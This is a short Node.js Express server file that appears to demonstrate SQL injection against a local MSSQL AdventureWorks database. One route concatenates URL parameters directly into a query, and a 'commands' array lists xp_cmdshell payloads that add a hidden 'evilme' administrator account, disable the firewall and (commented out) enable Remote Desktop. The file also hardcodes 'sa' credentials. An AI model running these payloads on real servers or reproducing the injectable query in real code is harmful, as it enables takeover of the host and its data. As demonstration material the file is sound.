// web.js
var express = require("express");
var logfmt = require("logfmt");
var fs = require("fs");

var sql = require('mssql'); 

var app = express();

app.use(logfmt.requestLogger());
app.use(express.static(__dirname + '/public'));


var config = {
    user: 'sa',
    password: 'Password1',
    server: 'localhost',
    database: 'AdventureWorks2012'
}

var commands = [
"select * from GLGLIVE.dbo.CITY",
"EXEC master.dbo.xp_cmdshell Systeminfo--",
"exec master.dbo.xp_cmdshell 'dir c:\'-- ",
"EXEC xp_cmdshell 'net user evilme pa$$w0rd /ADD'--",
"EXEC xp_cmdshell 'net localgroup Administrators evilme /ADD'",
"EXEC xp_cmdshell 'netsh firewall set opmode disable'"
//"EXEC xp_cmdshell 'reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
];

app.get('/', function(req, res) {
    res.sendfile('./public/views/index.html');
});

app.get('/vendor', function(req, res) {
	console.log("Executing : vendor ");
	var qry = "select * from Purchasing.Vendor";
	var connection = new sql.Connection(config, function(err) {
		var request = new sql.Request(connection); 
		request.query(qry, function(err, recordset)
		{
			res.json(recordset);
		});
	});
});

app.get('/product/:maxprice/:size', function(req, res) {
	console.log("Executing : " + req.params.maxprice, req.params.size);
	var qry = "select ProductID,Name,ProductNumber,ListPrice,Size from Production.Product where ListPrice < " 
	+ req.params.maxprice 
	+ " and Size = '" + req.params.size + "'" ;
	var connection = new sql.Connection(config, function(err) {
		var request = new sql.Request(connection); 
		request.query(qry, function(err, recordset)
		{
			res.json(recordset);
		});
	});
});

var port = Number(process.env.PORT || 5000);
app.listen(port, function() {
    console.log("Listening on " + port);
});